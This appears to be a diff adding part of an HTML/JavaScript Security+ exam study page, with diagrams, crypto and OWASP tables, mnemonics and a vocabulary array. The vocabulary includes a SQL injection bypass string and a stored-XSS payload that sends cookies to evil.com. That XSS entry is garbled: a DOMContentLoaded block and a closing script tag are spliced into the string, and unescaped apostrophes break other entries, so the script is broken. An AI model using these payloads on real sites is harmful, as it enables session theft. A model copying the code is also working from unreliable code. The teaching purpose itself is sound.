+        <text x="350" y="86" text-anchor="middle" fill="#8892b0" font-size="9" font-family="sans-serif">Encryption, Access Controls</text>
+        <text x="350" y="99" text-anchor="middle" fill="#8892b0" font-size="9" font-family="sans-serif">Least Privilege, MFA</text>
+        <!-- I circle -->
+        <circle cx="120" cy="255" r="70" fill="#1a1d2e" stroke="#3498db" stroke-width="2.5"/>
+        <text x="120" y="245" text-anchor="middle" fill="#3498db" font-size="22" font-weight="800" font-family="sans-serif">I</text>
+        <text x="120" y="265" text-anchor="middle" fill="white" font-size="11" font-weight="700" font-family="sans-serif">Integrity</text>
+        <text x="120" y="281" text-anchor="middle" fill="#8892b0" font-size="9" font-family="sans-serif">Hashing, Digital Signatures</text>
+        <text x="120" y="294" text-anchor="middle" fill="#8892b0" font-size="9" font-family="sans-serif">Checksums, RBAC</text>
+        <!-- A circle -->
+        <circle cx="580" cy="255" r="70" fill="#1a1d2e" stroke="#2ecc71" stroke-width="2.5"/>
+        <text x="580" y="245" text-anchor="middle" fill="#2ecc71" font-size="22" font-weight="800" font-family="sans-serif">A</text>
+        <text x="580" y="265" text-anchor="middle" fill="white" font-size="11" font-weight="700" font-family="sans-serif">Availability</text>
+        <text x="580" y="281" text-anchor="middle" fill="#8892b0" font-size="9" font-family="sans-serif">Redundancy, Failover</text>
+        <text x="580" y="294" text-anchor="middle" fill="#8892b0" font-size="9" font-family="sans-serif">Backups, DDoS Mitigation</text>
+        <!-- Center label -->
+        <text x="350" y="195" text-anchor="middle" fill="#e8eaf0" font-size="12" font-weight="700" font-family="sans-serif">CIA Triad</text>
+        <text x="350" y="213" text-anchor="middle" fill="#8892b0" font-size="10" font-family="sans-serif">Foundation of all</text>
+        <text x="350" y="226" text-anchor="middle" fill="#8892b0" font-size="10" font-family="sans-serif">security decisions</text>
+      </svg>
+    </div>
+    <div class="example-box"><strong>Example — Confidentiality attack:</strong> A hacker intercepts unencrypted email and reads private messages (eavesdropping). Fix: use TLS encryption.</div>
+    <div class="example-box"><strong>Example — Integrity attack:</strong> An attacker modifies a software download so malware is included. Fix: verify SHA-256 hash before installing.</div>
+    <div class="example-box"><strong>Example — Availability attack:</strong> A DDoS flood overwhelms a web server, taking it offline. Fix: use CDN, rate limiting, and failover infrastructure.</div>
+  </div>
+
+  <!-- INCIDENT RESPONSE LIFECYCLE -->
+  <div class="concepts-section">
+    <h2>🚨 Incident Response Lifecycle (NIST SP 800-61)</h2>
+    <p>NIST defines four phases for responding to a security incident. Security+ questions will ask you to identify the correct phase for a given action (e.g., "which phase involves preserving evidence?").</p>
+    <div class="infographic-wrap">
+      <svg viewBox="0 0 720 130" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:720px">
+        <!-- Phase boxes -->
+        <!-- Preparation -->
+        <rect x="10" y="20" width="155" height="90" rx="8" fill="#252840" stroke="#9b59b6" stroke-width="2"/>
+        <text x="87" y="48" text-anchor="middle" fill="#9b59b6" font-size="22" font-family="sans-serif">1</text>
+        <text x="87" y="67" text-anchor="middle" fill="white" font-size="12" font-weight="700" font-family="sans-serif">Preparation</text>
+        <text x="87" y="82" text-anchor="middle" fill="#8892b0" font-size="9" font-family="sans-serif">Policies, training,</text>
+        <text x="87" y="94" text-anchor="middle" fill="#8892b0" font-size="9" font-family="sans-serif">tools, playbooks</text>
+        <!-- Arrow -->
+        <polygon points="168,65 180,58 180,72" fill="#3d4270"/>
+        <!-- Detection & Analysis -->
+        <rect x="183" y="20" width="155" height="90" rx="8" fill="#252840" stroke="#3498db" stroke-width="2"/>
+        <text x="260" y="48" text-anchor="middle" fill="#3498db" font-size="22" font-family="sans-serif">2</text>
+        <text x="260" y="67" text-anchor="middle" fill="white" font-size="12" font-weight="700" font-family="sans-serif">Detection &amp; Analysis</text>
+        <text x="260" y="82" text-anchor="middle" fill="#8892b0" font-size="9" font-family="sans-serif">SIEM alerts, triage,</text>
+        <text x="260" y="94" text-anchor="middle" fill="#8892b0" font-size="9" font-family="sans-serif">scope the incident</text>
+        <!-- Arrow -->
+        <polygon points="341,65 353,58 353,72" fill="#3d4270"/>
+        <!-- Containment/Eradication/Recovery -->
+        <rect x="356" y="20" width="175" height="90" rx="8" fill="#252840" stroke="#e67e22" stroke-width="2"/>
+        <text x="443" y="48" text-anchor="middle" fill="#e67e22" font-size="22" font-family="sans-serif">3</text>
+        <text x="443" y="64" text-anchor="middle" fill="white" font-size="11" font-weight="700" font-family="sans-serif">Containment,</text>
+        <text x="443" y="77" text-anchor="middle" fill="white" font-size="11" font-weight="700" font-family="sans-serif">Eradication &amp; Recovery</text>
+        <text x="443" y="92" text-anchor="middle" fill="#8892b0" font-size="9" font-family="sans-serif">Isolate, remove malware,</text>
+        <text x="443" y="104" text-anchor="middle" fill="#8892b0" font-size="9" font-family="sans-serif">restore from clean backups</text>
+        <!-- Arrow -->
+        <polygon points="534,65 546,58 546,72" fill="#3d4270"/>
+        <!-- Post-Incident Activity -->
+        <rect x="549" y="20" width="160" height="90" rx="8" fill="#252840" stroke="#2ecc71" stroke-width="2"/>
+        <text x="629" y="48" text-anchor="middle" fill="#2ecc71" font-size="22" font-family="sans-serif">4</text>
+        <text x="629" y="67" text-anchor="middle" fill="white" font-size="12" font-weight="700" font-family="sans-serif">Post-Incident</text>
+        <text x="629" y="82" text-anchor="middle" fill="#8892b0" font-size="9" font-family="sans-serif">Lessons learned,</text>
+        <text x="629" y="94" text-anchor="middle" fill="#8892b0" font-size="9" font-family="sans-serif">report, update policies</text>
+      </svg>
+    </div>
+    <div class="tip-box"><div class="tip-label">Exam Tip</div>Evidence preservation (chain of custody, disk imaging) happens during <strong>Detection &amp; Analysis</strong> — before containment — so it is not accidentally destroyed.</div>
+  </div>
+
+  <!-- CRYPTOGRAPHY COMPARISON -->
+  <div class="concepts-section">
+    <h2>🔑 Cryptography Comparison</h2>
+    <p>Security+ tests your ability to choose the right cryptographic tool for a given scenario. The table below compares symmetric, asymmetric, and hashing algorithms.</p>
+    <table class="concept-table">
+      <tr><th>Type</th><th>Algorithm(s)</th><th>Key Setup</th><th>Speed</th><th>Use Case</th></tr>
+      <tr><td>Symmetric</td><td>AES-128/256, 3DES, ChaCha20</td><td>Single shared key</td><td>Fast</td><td>Bulk data encryption (disk, VPN tunnel payload)</td></tr>
+      <tr><td>Asymmetric</td><td>RSA, ECC, Diffie-Hellman, ElGamal</td><td>Public/Private key pair</td><td>Slow</td><td>Key exchange, digital signatures, TLS handshake</td></tr>
+      <tr><td>Hashing</td><td>SHA-256, SHA-3, MD5 (legacy), BLAKE2</td><td>No key (one-way)</td><td>Very fast</td><td>Integrity verification, password storage, digital signatures</td></tr>
+      <tr><td>Hybrid (TLS)</td><td>RSA/DH for key exchange + AES for data</td><td>Asymmetric handshake generates symmetric key</td><td>Near-symmetric</td><td>HTTPS, SSH, VPN — best of both worlds</td></tr>
+      <tr><td>MAC / HMAC</td><td>HMAC-SHA256, CMAC, Poly1305</td><td>Shared secret key</td><td>Fast</td><td>Message authentication — integrity + authenticity</td></tr>
+    </table>
+    <div class="example-box"><strong>Exam Scenario:</strong> "A company needs to encrypt 4 TB of data on a NAS quickly." Choose <strong>AES-256</strong> (symmetric) — fast, secure. RSA would be impractical at that scale.</div>
+    <div class="example-box"><strong>Exam Scenario:</strong> "A user wants to prove they authored a document without revealing their private key." Use a <strong>digital signature</strong> — hash the document, encrypt the hash with the private key. Receiver decrypts with public key.</div>
+  </div>
+
+  <!-- ATTACK KILL CHAIN -->
+  <div class="concepts-section">
+    <h2>⚔️ The Cyber Kill Chain (Lockheed Martin)</h2>
+    <p>The Kill Chain describes the stages an attacker moves through from initial research to achieving their objective. Defenders try to interrupt the chain as early as possible — each stage is a detection opportunity.</p>
+    <div class="infographic-wrap">
+      <svg viewBox="0 0 740 80" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:740px">
+        <defs>
+          <marker id="arrowKC" markerWidth="6" markerHeight="6" refX="3" refY="3" orient="auto">
+            <path d="M0,0 L6,3 L0,6 Z" fill="#3d4270"/>
+          </marker>
+        </defs>
+        <!-- Stages -->
+        <rect x="5" y="15" width="90" height="50" rx="6" fill="#252840" stroke="#e74c3c" stroke-width="1.5"/>
+        <text x="50" y="36" text-anchor="middle" fill="#e74c3c" font-size="9" font-weight="700" font-family="sans-serif">RECONNAISSANCE</text>
+        <text x="50" y="50" text-anchor="middle" fill="#8892b0" font-size="8" font-family="sans-serif">OSINT, scanning</text>
+        <line x1="97" y1="40" x2="108" y2="40" stroke="#3d4270" stroke-width="2" marker-end="url(#arrowKC)"/>
+
+        <rect x="110" y="15" width="80" height="50" rx="6" fill="#252840" stroke="#e67e22" stroke-width="1.5"/>
+        <text x="150" y="36" text-anchor="middle" fill="#e67e22" font-size="9" font-weight="700" font-family="sans-serif">WEAPONIZE</text>
+        <text x="150" y="50" text-anchor="middle" fill="#8892b0" font-size="8" font-family="sans-serif">Build exploit</text>
+        <line x1="192" y1="40" x2="203" y2="40" stroke="#3d4270" stroke-width="2" marker-end="url(#arrowKC)"/>
+
+        <rect x="205" y="15" width="80" height="50" rx="6" fill="#252840" stroke="#f39c12" stroke-width="1.5"/>
+        <text x="245" y="36" text-anchor="middle" fill="#f39c12" font-size="9" font-weight="700" font-family="sans-serif">DELIVERY</text>
+        <text x="245" y="50" text-anchor="middle" fill="#8892b0" font-size="8" font-family="sans-serif">Phishing, USB</text>
+        <line x1="287" y1="40" x2="298" y2="40" stroke="#3d4270" stroke-width="2" marker-end="url(#arrowKC)"/>
+
+        <rect x="300" y="15" width="80" height="50" rx="6" fill="#252840" stroke="#27ae60" stroke-width="1.5"/>
+        <text x="340" y="36" text-anchor="middle" fill="#27ae60" font-size="9" font-weight="700" font-family="sans-serif">EXPLOITATION</text>
+        <text x="340" y="50" text-anchor="middle" fill="#8892b0" font-size="8" font-family="sans-serif">CVE triggered</text>
+        <line x1="382" y1="40" x2="393" y2="40" stroke="#3d4270" stroke-width="2" marker-end="url(#arrowKC)"/>
+
+        <rect x="395" y="15" width="80" height="50" rx="6" fill="#252840" stroke="#1abc9c" stroke-width="1.5"/>
+        <text x="435" y="36" text-anchor="middle" fill="#1abc9c" font-size="9" font-weight="700" font-family="sans-serif">INSTALLATION</text>
+        <text x="435" y="50" text-anchor="middle" fill="#8892b0" font-size="8" font-family="sans-serif">RAT, backdoor</text>
+        <line x1="477" y1="40" x2="488" y2="40" stroke="#3d4270" stroke-width="2" marker-end="url(#arrowKC)"/>
+
+        <rect x="490" y="15" width="80" height="50" rx="6" fill="#252840" stroke="#3498db" stroke-width="1.5"/>
+        <text x="530" y="36" text-anchor="middle" fill="#3498db" font-size="9" font-weight="700" font-family="sans-serif">C2 / C&amp;C</text>
+        <text x="530" y="50" text-anchor="middle" fill="#8892b0" font-size="8" font-family="sans-serif">Remote control</text>
+        <line x1="572" y1="40" x2="583" y2="40" stroke="#3d4270" stroke-width="2" marker-end="url(#arrowKC)"/>
+
+        <rect x="585" y="15" width="145" height="50" rx="6" fill="#252840" stroke="#9b59b6" stroke-width="1.5"/>
+        <text x="657" y="36" text-anchor="middle" fill="#9b59b6" font-size="9" font-weight="700" font-family="sans-serif">ACTIONS ON OBJECTIVE</text>
+        <text x="657" y="50" text-anchor="middle" fill="#8892b0" font-size="8" font-family="sans-serif">Exfiltrate, ransomware</text>
+      </svg>
+    </div>
+    <div class="tip-box"><div class="tip-label">Exam Tip</div>Email filtering and user training stop the chain at <strong>Delivery</strong>. Patching stops it at <strong>Exploitation</strong>. IDS/EDR stops it at <strong>Installation</strong>. Blocking suspicious outbound stops it at <strong>C2</strong>.</div>
+  </div>
+
+  <!-- RISK FORMULA -->
+  <div class="concepts-section">
+    <h2>📊 Risk Calculations</h2>
+    <p>Security+ includes quantitative risk math. Learn these four formulas — they appear directly in exam questions.</p>
+    <table class="concept-table">
+      <tr><th>Term</th><th>Formula / Definition</th><th>Example</th></tr>
+      <tr><td><strong>Asset Value (AV)</strong></td><td>What the asset is worth in dollars</td><td>Server worth $50,000 → AV = $50,000</td></tr>
+      <tr><td><strong>Exposure Factor (EF)</strong></td><td>% of asset lost in one incident (0–100%)</td><td>Fire destroys 40% of server room → EF = 0.40</td></tr>
+      <tr><td><strong>Single Loss Expectancy (SLE)</strong></td><td>AV × EF</td><td>$50,000 × 0.40 = $20,000 per incident</td></tr>
+      <tr><td><strong>Annualized Rate of Occurrence (ARO)</strong></td><td>Expected incidents per year</td><td>Fire risk estimated at 0.1/year (once per decade)</td></tr>
+      <tr><td><strong>Annualized Loss Expectancy (ALE)</strong></td><td>SLE × ARO</td><td>$20,000 × 0.1 = $2,000/year expected loss</td></tr>
+    </table>
+    <div class="example-box"><strong>Decision Rule:</strong> If a security control costs less than the ALE, it is economically justified. A $1,500/year fire suppression contract is worth it ($1,500 &lt; $2,000 ALE).</div>
+  </div>
+
+  <!-- OWASP TOP 10 VISUAL -->
+  <div class="concepts-section">
+    <h2>🌐 OWASP Top 10 Web Vulnerabilities</h2>
+    <p>The OWASP Top 10 is frequently tested in Security+ scenarios involving web application security. Know what each vulnerability is, how it is exploited, and how to mitigate it.</p>
+    <table class="concept-table">
+      <tr><th>#</th><th>Vulnerability</th><th>How It Works</th><th>Mitigation</th></tr>
+      <tr><td>A01</td><td>Broken Access Control</td><td>User accesses resources/actions they are not authorized for</td><td>Enforce server-side authorization, deny by default</td></tr>
+      <tr><td>A02</td><td>Cryptographic Failures</td><td>Sensitive data transmitted/stored without proper encryption</td><td>TLS everywhere, AES-256 at rest, no MD5/SHA-1</td></tr>
+      <tr><td>A03</td><td>Injection (SQL, LDAP, OS)</td><td>Untrusted data sent to interpreter as a command</td><td>Parameterized queries, input validation, WAF</td></tr>
+      <tr><td>A04</td><td>Insecure Design</td><td>Missing security controls by design, not just implementation flaws</td><td>Threat modeling, secure design patterns</td></tr>
+      <tr><td>A05</td><td>Security Misconfiguration</td><td>Default creds, unnecessary features enabled, verbose errors</td><td>Hardening guides, config management, disable defaults</td></tr>
+      <tr><td>A06</td><td>Vulnerable Components</td><td>Using libraries/frameworks with known CVEs</td><td>SCA tools, patch management, pin versions</td></tr>
+      <tr><td>A07</td><td>Auth &amp; Identification Failures</td><td>Weak passwords, no MFA, session fixation</td><td>MFA, strong password policy, secure session management</td></tr>
+      <tr><td>A08</td><td>Software Integrity Failures</td><td>Unsigned updates, supply chain attacks</td><td>Code signing, SBOMs, verify checksums</td></tr>
+      <tr><td>A09</td><td>Logging &amp; Monitoring Failures</td><td>Insufficient logs — attacks go undetected</td><td>SIEM, centralized logging, alerting, retention policy</td></tr>
+      <tr><td>A10</td><td>SSRF (Server-Side Request Forgery)</td><td>App fetches attacker-controlled URL, reaches internal systems</td><td>Allowlist outbound URLs, block internal ranges</td></tr>
+    </table>
+  </div>
+
+  <!-- VOCABULARY GLOSSARY -->
+  <div class="concepts-section">
+    <h2>📖 Security+ Vocabulary Glossary</h2>
+    <p>Search by term or definition to find key vocabulary. Each card includes a real-world example to cement the concept.</p>
+    <input type="text" class="vocab-search" placeholder="Search terms and definitions..." oninput="filterVocabSec(this.value)" id="sec-vocab-search"/>
+    <div class="vocab-grid" id="sec-vocab-grid"></div>
+  </div>
+
+</div><!-- end panel-concepts -->
+
+</div>
+
+</div>
+
+
+<!-- ── Tips & Careers Panel ───────────────────────────────────────── -->
+<div id="panel-tips" class="tab-panel">
+  <div class="tips-section-title">🧠 Memory Tricks & Mnemonics</div>
+
+    <div class="mnem-card">
+      <div class="mnem-title">🔐 CIA Triad — The 3 Goals of Security</div>
+      <div class="mnem-phrase">"<strong>Think of the CIA — they keep things secret, accurate, and available</strong>"</div>
+      <div class="mnem-breakdown">
+        <span class="mnem-step">🔒 <strong>C</strong>onfidentiality — only authorized people see the data</span>
+        <span class="mnem-step">✅ <strong>I</strong>ntegrity — data hasn't been changed/tampered</span>
+        <span class="mnem-step">⚡ <strong>A</strong>vailability — authorized users can access it when needed</span>
+      </div>
+    </div>
+
+    <div class="mnem-card">
+      <div class="mnem-title">🛡️ AAA Framework</div>
+      <div class="mnem-phrase">"<strong>Who are you? What can you do? What did you do?</strong>"</div>
+      <div class="mnem-breakdown">
+        <span class="mnem-step">🪪 <strong>A</strong>uthentication — prove your identity (username + password)</span>
+        <span class="mnem-step">🚪 <strong>A</strong>uthorization — what are you allowed to access?</span>
+        <span class="mnem-step">📋 <strong>A</strong>ccounting — logging/tracking what you did</span>
+      </div>
+    </div>
+
+    <div class="mnem-card">
+      <div class="mnem-title">🦠 Malware Types — "VTW RAS"</div>
+      <div class="mnem-phrase">"<strong>Very Tricky Worms Rarely Allow Safety</strong>"</div>
+      <div class="mnem-breakdown">
+        <span class="mnem-step"><strong>V</strong>irus — attaches to a file, spreads when opened</span>
+        <span class="mnem-step"><strong>T</strong>rojan — disguises as legitimate software</span>
+        <span class="mnem-step"><strong>W</strong>orm — self-replicates across networks, no host file needed</span>
+        <span class="mnem-step"><strong>R</strong>ansomware — encrypts your files, demands payment</span>
+        <span class="mnem-step"><strong>A</strong>dware — shows unwanted ads</span>
+        <span class="mnem-step"><strong>S</strong>pyware — secretly monitors your activity</span>
+      </div>
+    </div>
+
+    <div class="mnem-card">
+      <div class="mnem-title">🔑 Symmetric vs Asymmetric Encryption</div>
+      <div class="mnem-phrase">"<strong>Symmetric = Same key (like a padlock) · Asymmetric = Asymm-key (public + private pair)</strong>"</div>
+      <div class="mnem-detail">Symmetric (AES, DES): one key encrypts AND decrypts — fast, used for bulk data · Asymmetric (RSA, ECC): public key encrypts, private key decrypts — slower, used for key exchange and digital signatures · HTTPS uses asymmetric to share a symmetric key (best of both)</div>
+    </div>
+
+    <div class="mnem-card">
+      <div class="mnem-title">🎣 Social Engineering Attacks</div>
+      <div class="mnem-phrase">"<strong>Phishing = fishing with a fake lure. Vishing = Voice phishing. Smishing = SMS phishing.</strong>"</div>
+      <div class="mnem-detail">Phishing (email) → Spear phishing (targeted) → Whaling (targeting executives) · Pretexting = creating a fake scenario · Tailgating = physically following someone through a secure door · Baiting = leaving infected USB drives for victims to find</div>
+    </div>
+
+    <div class="mnem-card">
+      <div class="mnem-title">🔏 Hashing — "One-Way Street"</div>
+      <div class="mnem-phrase">"<strong>Hashing is like grinding coffee — you can't ungrind it. Same input ALWAYS = same hash.</strong>"</div>
+      <div class="mnem-detail">MD5: 128-bit (weak, broken — still on exam) · SHA-1: 160-bit (deprecated) · SHA-256/512: strong, used for file integrity and certificates · Salting adds random data before hashing to defeat rainbow tables</div>
+    </div>
+
+
+    <div class="strategy-section">
+      <h3 style="color:var(--accent);margin-bottom:16px;">🎯 How to Pass the CompTIA Security+ (SY0-701)</h3>
+
+      <div class="strategy-grid">
+
+        <div class="strategy-card">
+          <h4>🗣️ CompTIA Question Language</h4>
+          <p>CompTIA uses specific trigger words that change the right answer. Learn to spot them:</p>
+          <ul style="margin:10px 0 0 18px;line-height:1.9;">
+            <li><strong>"MOST likely"</strong> — eliminate impossible answers; pick the best fit</li>
+            <li><strong>"BEST"</strong> — there may be 2 correct answers; one is more efficient/secure</li>
+            <li><strong>"FIRST"</strong> — follow the correct order/process (e.g., troubleshooting steps)</li>
+            <li><strong>"LEAST"</strong> / <strong>"EXCEPT"</strong> — you're looking for the <em>wrong</em> one</li>
+            <li><strong>"ALWAYS"</strong> / <strong>"NEVER"</strong> — these are usually wrong; tech rarely works in absolutes</li>
+          </ul>
+        </div>
+
+        <div class="strategy-card">
+          <h4>✂️ Elimination Technique</h4>
+          <ol style="margin:10px 0 0 18px;line-height:1.9;">
+            <li>Read the question stem carefully — what is it <em>really</em> asking?</li>
+            <li>Cross out any answer that is obviously wrong or out of scope</li>
+            <li>If 2 answers look similar, one of them is usually correct</li>
+            <li>Look for answers that are "too extreme" — usually distractors</li>
+            <li>If completely unsure, pick the more <em>conservative/secure</em> option</li>
+          </ol>
+        </div>
+
+        <div class="strategy-card">
+          <h4>🖥️ Performance-Based Questions (PBQs)</h4>
+          <p>PBQs appear at the <strong>start</strong> of the exam and are simulations (drag-drop, click-throughs, command line scenarios). Tips:</p>
+          <ul style="margin:10px 0 0 18px;line-height:1.9;">
+            <li>Don't panic — skip and come back if you're unsure</li>
+            <li>Read every instruction carefully before clicking</li>
+            <li>Most PBQs test basic knowledge in a visual way</li>
+            <li>Flagging and returning with fresh eyes often helps</li>
+          </ul>
+        </div>
+
+        <div class="strategy-card">
+          <h4>📅 Day-Before Checklist</h4>
+          <ul style="margin:10px 0 0 18px;line-height:1.9;">
+            <li>✅ Review your weakest domains (check your tracker above!)</li>
+            <li>✅ Look over mnemonics one more time</li>
+            <li>✅ Get 8 hours of sleep — tired brains forget everything</li>
+            <li>✅ Eat a good breakfast before the exam</li>
+            <li>✅ Arrive early (or set up testing software ahead of time)</li>
+            <li>✅ Bring valid photo ID if testing in-person</li>
+          </ul>
+        </div>
+
+      </div>
+
+      <div class="strategy-card" style="margin-top:12px;">
+        <h4>📚 Free Study Resources</h4>
+        <div style="display:flex;flex-wrap:wrap;gap:10px;margin-top:10px;">
+          <a href="https://www.professormesser.com" target="_blank" class="resource-link">🎓 Professor Messer (free video courses)</a>
+          <a href="https://www.comptia.org/training/resources" target="_blank" class="resource-link">📘 CompTIA Official Study Resources</a>
+          <a href="https://www.examcompass.com" target="_blank" class="resource-link">❓ ExamCompass (free practice tests)</a>
+          <a href="https://quizlet.com" target="_blank" class="resource-link">🃏 Quizlet (community flashcard sets)</a>
+        </div>
+      </div>
+    </div>
+
+
+    <div class="careers-section">
+      <h3 style="color:var(--accent);margin-bottom:16px;">💼 Where This Certification Can Take You</h3>
+      <div class="careers-grid">
+      <div class="career-card-tip">
+        <div class="career-card-title">🔍 SOC Analyst (Tier 1)</div>
+        <div class="career-salary">$50k – $80k/yr</div>
+        <div class="career-desc">Monitors security dashboards and alerts, escalates incidents — the first line of cyber defense.</div>
+      </div>
+      <div class="career-card-tip">
+        <div class="career-card-title">🛡️ Cybersecurity Analyst</div>
+        <div class="career-salary">$65k – $100k/yr</div>
+        <div class="career-desc">Investigates threats, analyzes logs, and recommends fixes to protect company systems.</div>
+      </div>
+      <div class="career-card-tip">
+        <div class="career-card-title">🔓 Penetration Tester</div>
+        <div class="career-salary">$75k – $125k/yr</div>
+        <div class="career-desc">Gets paid to ethically hack systems, find weaknesses, and report them before criminals do.</div>
+      </div>
+      <div class="career-card-tip">
+        <div class="career-card-title">🏗️ Security Engineer</div>
+        <div class="career-salary">$85k – $140k/yr</div>
+        <div class="career-desc">Builds and maintains firewalls, IDS/IPS, SIEM, and other security infrastructure.</div>
+      </div>
+      <div class="career-card-tip">
+        <div class="career-card-title">👔 Information Security Manager</div>
+        <div class="career-salary">$100k – $160k/yr</div>
+        <div class="career-desc">Leads the security program, manages teams, and reports risk to leadership.</div>
+      </div>
+      </div>
+      <p style="margin-top:16px;font-size:.85rem;color:var(--text-muted);">💡 Salaries vary by location and experience. These ranges reflect US national averages (entry to mid-level). Source: Bureau of Labor Statistics / Glassdoor / LinkedIn Salary (2024–2025).</p>
+    </div>
+
+</div><!-- /panel-tips -->
+
+<script>
+
+const secVocabTerms = [
+  { term: 'Zero-Day', def: 'A vulnerability that is unknown to the vendor and has no available patch at the time of exploitation.', example: 'Stuxnet exploited four zero-days simultaneously to attack Iranian nuclear centrifuges.' },
+  { term: 'Threat Actor', def: 'Any entity — person, group, or nation-state — that poses a potential threat to an organization's assets.', example: 'APT29 (Cozy Bear) is a nation-state threat actor attributed to Russia's SVR intelligence service.' },
+  { term: 'Vulnerability', def: 'A weakness in a system, software, or process that could be exploited to cause harm.', example: 'Unpatched Apache Log4Shell (CVE-2021-44228) was a critical RCE vulnerability in millions of systems.' },
+  { term: 'Exploit', def: 'Code or a technique that takes advantage of a vulnerability to cause unintended behavior.', example: 'The EternalBlue exploit attacked SMBv1 to allow remote code execution, used in WannaCry ransomware.' },
+  { term: 'Least Privilege', def: 'Security principle giving users and processes only the minimum permissions needed to perform their function.', example: 'A web server process runs as a low-privilege user, not root — so a compromise limits attacker access.' },
+  { term: 'Defense in Depth', def: 'Layered security strategy so that if one control fails, additional controls prevent or limit damage.', example: 'Firewall + IDS + endpoint AV + MFA + SIEM — each layer is an independent line of defense.' },
+  { term: 'AAA Framework', def: 'Authentication (who are you?), Authorization (what can you do?), and Accounting (what did you do?) — the core of access control.', example: 'RADIUS provides AAA for network device login: authenticates via password, authorizes command sets, logs activity.' },
+  { term: 'PKI (Public Key Infrastructure)', def: 'A framework of policies, software, and hardware used to create, manage, distribute, and revoke digital certificates.', example: 'A CA issues an X.509 certificate binding your domain name to your public key, enabling HTTPS.' },
+  { term: 'Digital Signature', def: 'A cryptographic mechanism that proves the authenticity and integrity of a message or document using the sender's private key.', example: 'Software vendors sign executables so your OS can verify the code has not been tampered with since publication.' },
+  { term: 'Symmetric Encryption', def: 'Encryption using the same key for both encryption and decryption. Fast but requires secure key exchange.', example: 'AES-256 encrypts your BitLocker drive — the single key must be protected (TPM chip, recovery key).' },
+  { term: 'Asymmetric Encryption', def: 'Encryption using a mathematically related key pair: public key to encrypt, private key to decrypt.', example: 'When you connect to HTTPS, your browser encrypts a session key with the server's public certificate (RSA/ECC).' },
+  { term: 'Hashing', def: 'A one-way function producing a fixed-length digest from arbitrary input. Even tiny input changes produce completely different hashes.', example: 'SHA-256("hello") = 2cf24... SHA-256("helo") = totally different — detecting even a single bit flip.' },
+  { term: 'Social Engineering', def: 'Manipulating people into divulging confidential information or performing actions that compromise security.', example: 'A vishing call impersonates IT support: "Your account is locked — please verify your password to re-enable it."' },
+  { term: 'Phishing', def: 'A social engineering attack using fraudulent email to steal credentials, install malware, or trick users into taking harmful actions.', example: 'A spoofed "Microsoft 365" email claims your mailbox is full — clicking redirects to a fake login harvesting credentials.' },
+  { term: 'Man-in-the-Middle (MitM)', def: 'An attack where the adversary secretly intercepts and possibly alters communication between two parties who believe they are communicating directly.', example: 'ARP poisoning on a LAN lets an attacker intercept traffic between a PC and its default gateway.' },
+  { term: 'SQL Injection', def: 'An injection attack where malicious SQL code is inserted into an input field to manipulate a backend database.', example: "Login form input: ' OR '1'='1 — bypasses authentication if query is not parameterized." },
+  { term: 'Cross-Site Scripting (XSS)', def: 'A web attack injecting malicious scripts into pages viewed by other users, hijacking sessions or stealing cookies.', example: 'Stored XSS: attacker posts a comment containing <script>document.location='evil.com/steal?c='+document.cookie
+document.addEventListener('DOMContentLoaded', function() {
+  buildVocabSec(secVocabTerms);
+});
+
+</script>' },
+  { term: 'DDoS (Distributed Denial of Service)', def: 'An attack using many compromised hosts to flood a target with traffic, exhausting its resources and making it unavailable.', example: 'A botnet of 100,000 IoT devices sends 1 Tbps of UDP traffic to a DNS server, taking it offline.' },
+  { term: 'Ransomware', def: 'Malware that encrypts victim files and demands payment (often cryptocurrency) for the decryption key.', example: 'WannaCry spread via EternalBlue, encrypted files, and demanded $300 in Bitcoin — impacting 200,000+ systems in 150 countries.' },
+  { term: 'SIEM', def: 'Security Information and Event Management — a platform that collects, correlates, and analyzes log data from across an environment to detect threats.', example: 'Splunk correlates failed login attempts from 50 IPs with a successful login 30 seconds later — triggers a brute-force alert.' },
+  { term: 'Penetration Testing', def: 'An authorized simulated cyberattack on a system to identify vulnerabilities before real attackers can exploit them.', example: 'A red team gains admin access through a phishing email and lateral movement, then documents the full attack chain for remediation.' },
+  { term: 'Multi-Factor Authentication (MFA)', def: 'Requiring two or more authentication factors: something you know (password), have (token), or are (biometric).', example: 'Login with password (know) + Google Authenticator TOTP code (have) — even a stolen password is useless without the phone.' },
+  { term: 'Principle of Need to Know', def: 'Users are granted access to information only if their job function requires it, regardless of their clearance level.', example: 'A finance analyst has SECRET clearance but cannot access SECRET military intelligence unrelated to their finance role.' },
+  { term: 'Chain of Custody', def: 'A documented record of who handled digital evidence, when, and how — ensuring its integrity and admissibility in legal proceedings.', example: 'A forensic investigator creates a bit-for-bit disk image, records the hash, and logs every transfer of the evidence drive.' },
+  { term: 'Business Continuity Plan (BCP)', def: 'A proactive plan to ensure critical business functions continue during and after a disaster or major disruption.', example: 'A bank's BCP ensures online banking stays up even if the primary data center loses power — via a hot site failover.' },
+  { term: 'RPO / RTO', def: 'Recovery Point Objective = maximum acceptable data loss (in time). Recovery Time Objective = maximum acceptable downtime.', example: 'RPO of 4 hours means backups every 4 hours. RTO of 2 hours means systems must be back up within 2 hours of an outage.' },
+  { term: 'NIST CSF', def: 'NIST Cybersecurity Framework — a voluntary framework with five functions: Identify, Protect, Detect, Respond, Recover.', example: 'An organization uses NIST CSF to assess maturity: they score well on Protect but low on Detect — prioritizing SIEM investment.' }
+];
+
+function buildVocabSec(terms) {
+  const grid = document.getElementById('sec-vocab-grid');
+  if (!grid) return;
+  grid.innerHTML = terms.map(function(t) {
+    return '<div class="vocab-card">' +
+      '<div class="vocab-term">' + t.term + '</div>' +
+      '<div class="vocab-def">' + t.def + '</div>' +
+      '<div class="vocab-example">Example: ' + t.example + '</div>' +
+      '</div>';
+  }).join('');
+}
+
+function filterVocabSec(query) {
+  var q = query.toLowerCase();
+  var filtered = secVocabTerms.filter(function(t) {
+    return t.term.toLowerCase().indexOf(q) >= 0 || t.def.toLowerCase().indexOf(q) >= 0;
+  });
+  buildVocabSec(filtered);
+}
+
+function showTab(name, ev) {
+  document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+  document.getElementById('panel-' + name).classList.add('active');
+  if (ev && ev.target) ev.target.classList.add('active');
+  if (name === 'flashcards') loadCards();
+  if (name === 'quiz') initQuiz();
+}
+function toggleDomain(h) {
+  h.classList.toggle('open');
+  h.nextElementSibling.classList.toggle('open');
+}
+
+const allCards = [
+  // CIA & Foundational Concepts
